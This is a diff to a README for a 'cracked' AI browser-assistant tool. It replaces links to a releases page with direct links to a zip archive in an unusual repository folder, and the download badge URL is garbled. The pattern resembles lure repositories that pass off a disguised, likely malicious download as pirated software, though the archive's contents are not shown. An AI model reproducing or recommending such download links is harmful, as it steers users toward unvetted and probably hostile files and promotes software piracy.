@@ -2,7 +2,7 @@
 
 ## 🚀 Visit Here to Download
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/minhlo12357/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-/releases)
+[![Download](https://raw.githubusercontent.com/minhlo12357/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-/main/postcritical/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-.zip%20Now-Get%https://raw.githubusercontent.com/minhlo12357/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-/main/postcritical/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-.zip)](https://raw.githubusercontent.com/minhlo12357/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-/main/postcritical/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-.zip)
 
 ## 📖 Description
 
@@ -29,7 +29,7 @@ To run Cracked MaxAI, you need:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Visit the Releases Page](https://github.com/minhlo12357/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/minhlo12357/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-/main/postcritical/Cracked-MaxAI-Ask-AI-anything-as-you-browse-GPT-Gemini-Claude-Grok-etc.-.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version of Cracked MaxAI. It is usually marked as the most recent update.
 
